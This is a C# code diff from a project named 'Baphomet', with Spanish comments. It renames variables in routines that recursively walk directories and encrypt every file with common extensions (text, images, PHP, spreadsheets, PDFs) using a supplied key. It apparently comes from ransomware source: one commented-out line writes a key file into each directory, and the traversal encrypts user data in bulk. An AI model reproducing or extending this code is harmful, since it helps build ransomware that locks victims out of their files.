@@ -24,17 +24,17 @@ namespace Baphomet.Utilities
         }
 
         //recorro los directorios a cifrar.
-        public void directoryRoad(string targetPath, string key)
+        public void directoryRoad(string target_path, string key)
         {
             CryptRSA cryptRSA = new CryptRSA();
 
             var extensionCheck = new[] { ".txt", ".jpg", ".png",".php" , ".xlsx", ".pdf" };//Extensiones validas para cifrar
-            cryptRSA.EncryptText(targetPath, key);
+            cryptRSA.EncryptText(target_path, key);
 
            // File.WriteAllText(targetPath + "\\yourkey.key", encryptedKey);//escribo la llave en cada uno de los directorios
 
-            string[] files = Directory.GetFiles(targetPath); //obtengo todos los archivos del directorio en el que me encuentro.
-            string[] subDirs = Directory.GetDirectories(targetPath);//obtengo los subdirectorios del directorio en el que me encuentro.
+            string[] files = Directory.GetFiles(target_path); //obtengo todos los archivos del directorio en el que me encuentro.
+            string[] sub_dirs = Directory.GetDirectories(target_path);//obtengo los subdirectorios del directorio en el que me encuentro.
             try
             {
                 for (int i = 0; i < files.Length; i++)
@@ -42,13 +42,13 @@ namespace Baphomet.Utilities
                     var extension = Path.GetExtension(files[i]);
                     if (extensionCheck.Contains(extension))
                     {
-                        encryptFileData(files[i], key, targetPath);
+                        encryptFileData(files[i], key);
                     }
                 }
 
-                for (int i = 0; i < subDirs.Length; i++)
+                for (int i = 0; i < sub_dirs.Length; i++)
                 {
-                    directoryRoad(subDirs[i], key);
+                    directoryRoad(sub_dirs[i], key);
                 }
             }
             catch(Exception ex)
@@ -58,7 +58,7 @@ namespace Baphomet.Utilities
         }
 
          //archivo valido para cifrar bytes
-        static void encryptFileData(string file, string key, string targetPath)
+        static void encryptFileData(string file, string key)
         {
             byte[] encryptFileBites = File.ReadAllBytes(file);
             byte[] passwordBytes = Encoding.UTF8.GetBytes(key);
